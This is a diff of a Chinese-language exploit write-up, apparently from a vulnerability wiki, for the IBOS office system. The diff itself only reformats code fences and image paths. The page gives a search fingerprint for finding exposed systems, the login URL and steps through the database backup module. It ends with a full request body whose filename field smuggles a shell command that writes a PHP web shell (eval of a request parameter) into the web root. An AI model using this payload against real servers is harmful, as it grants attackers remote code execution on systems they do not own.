@@ -20,36 +20,22 @@ body="IBOS" && body="login-panel"
 
 登录页面
 
-```plain
+```
 http://xxx.xxx.xxx.xxx/?r=dashboard/default/login
 ```
 
-
-
 找到数据库备份模块
 
-
-
-![](images/202202091853548.png)
-
-
+![](../.gitbook/assets/202202091853548.png)
 
 提交并抓包
 
-
-
-![](images/202202091853668.png)
-
-
+![](../.gitbook/assets/202202091853668.png)
 
 修改filename参数发送包会上传test.php文件到根目录
 
-
-
-```plain
+```
 backuptype=all&custom_enabled=1&method=shell&sizelimit=2048&extendins=0&sqlcompat=MYSQL41&sqlcharset=utf8&usehex=0&usezip=0&filename=peiqi%26echo "<?php eval($_REQUEST[test]);?>">test%PATHEXT:~0,1%php%26test&dbSubmit=1
 ```
 
-
-
-![](images/202202091854875.png)
+![](../.gitbook/assets/202202091854875.png)
